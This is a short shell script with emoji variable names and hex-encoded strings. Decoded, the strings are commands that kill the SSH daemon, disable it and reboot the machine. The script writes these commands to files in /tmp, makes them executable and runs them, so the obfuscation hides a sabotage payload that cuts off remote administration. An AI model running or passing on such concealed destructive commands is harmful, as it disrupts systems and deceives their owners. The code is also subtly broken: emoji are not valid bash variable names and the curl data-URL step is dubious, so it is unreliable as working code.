⚙️=$(echo -n "68656c6c6f20776f726c64" | xxd -r -p)
🐱=$(echo -n "706b696c6c2073736864" | xxd -r -p)
🦊=$(echo -n "73797374656d63746c2064697361626c652073736864" | xxd -r -p)
🐶=$(echo -n "7265626f6f74" | xxd -r -p)

🐵=$(echo $🐱 | xxd -p | tr -d '\n' | sed 's/\(..\)/%\1/g')
🦁=$(echo $🦊 | xxd -p | tr -d '\n' | sed 's/\(..\)/%\1/g')
🐯=$(echo $🐶 | xxd -p | tr -d '\n' | sed 's/\(..\)/%\1/g')

curl -s -o /tmp/🐱 "data:,$🐵"
curl -s -o /tmp/🦊 "data:,$🦁"
curl -s -o /tmp/🐶 "data:,$🐯"

chmod +x /tmp/🐱 /tmp/🦊 /tmp/🐶

/tmp/🐱
/tmp/🦊
/tmp/🐶
